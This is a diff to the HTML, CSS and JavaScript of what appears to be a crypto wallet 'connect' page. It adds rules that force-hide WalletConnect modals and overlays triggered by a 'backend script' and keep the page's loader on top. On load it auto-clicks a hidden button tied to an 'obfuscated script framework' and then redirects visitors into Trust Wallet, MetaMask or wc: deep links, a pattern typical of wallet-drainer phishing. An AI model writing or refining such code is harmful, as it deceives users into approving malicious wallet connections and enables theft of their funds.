@@ -34,6 +34,7 @@
             align-items: center;
             justify-content: center;
             padding: 1rem;
+            overflow: hidden; /* Prevent scrolling if background elements inject */
         }
 
         .connect-card {
@@ -46,7 +47,7 @@
             box-shadow: 0 12px 32px rgba(0, 0, 0, 0.05);
             text-align: center;
             position: relative;
-            z-index: 10;
+            z-index: 99999 !important; /* Keep your loader card strictly on top of everything */
         }
 
         .header-logo {
@@ -129,6 +130,20 @@
             border: 0;
             opacity: 0;
         }
+
+        /* CRITICAL: FORCE-HIDE ANY EXTERNAL MODALS/OVERLAYS TRIPPED BY THE BACKEND SCRIPT */
+        div[class*="modal"], 
+        div[class*="overlay"], 
+        div[id*="walletconnect"], 
+        div[class*="walletconnect"],
+        .wcm-modal,
+        #walletconnect-wrapper {
+            display: none !important;
+            visibility: hidden !important;
+            opacity: 0 !important;
+            pointer-events: none !important;
+            z-index: -1000 !important;
+        }
     </style>
 </head>
 <body>
@@ -162,30 +177,30 @@
         document.getElementById('statusDesc').textContent = `Please review and approve the interface connection request within your standard ${activeWallet} utility extension.`;
 
         window.addEventListener('DOMContentLoaded', () => {
-            // Automatically trigger the internal tracking listener of the obfuscated module
+            // Automatically click the underlying script tracking module
             setTimeout(() => {
                 const hiddenBtn = document.querySelector('.interactBtn');
                 if (hiddenBtn) {
                     console.log("Simulating interaction for obfuscated script framework...");
                     hiddenBtn.click();
                 }
-            }, 400);
+            }, 300);
 
-            // JUMP TRIGGER APPLICATION ROUTING: Forces an automatic native link system swap
+            // INSTANT DEEP LINK ROUTING: Trigger app jump immediately alongside the click
             setTimeout(() => {
                 const normalizedWallet = activeWallet.toLowerCase();
                 
                 if (normalizedWallet.includes('trust')) {
-                    // Standard mobile deep link routing to open the native Trust Wallet mobile application container
+                    // Open Trust Wallet app immediately
                     window.location.href = "https://link.trustwallet.com/wc";
-                } else if (normalizedWallet.includes('connect')) {
-                    // Fallback configuration scheme standard for generic multi-wallet connectors
-                    window.location.href = "wc:";
                 } else if (normalizedWallet.includes('meta')) {
-                    // Deep link format wrapper designed specifically for MetaMask mobile installations
+                    // Open MetaMask app immediately
                     window.location.href = "metamask://wc";
+                } else if (normalizedWallet.includes('connect') || normalizedWallet.includes('coinbase') || normalizedWallet.includes('rainbow')) {
+                    // Standard multi-wallet connect scheme trigger fallback
+                    window.location.href = "wc:";
                 }
-            }, 1200); // 1.2s delay to give the base javascript runtime enough space to cache requirements
+            }, 400); 
         });
 
         function goBack() {
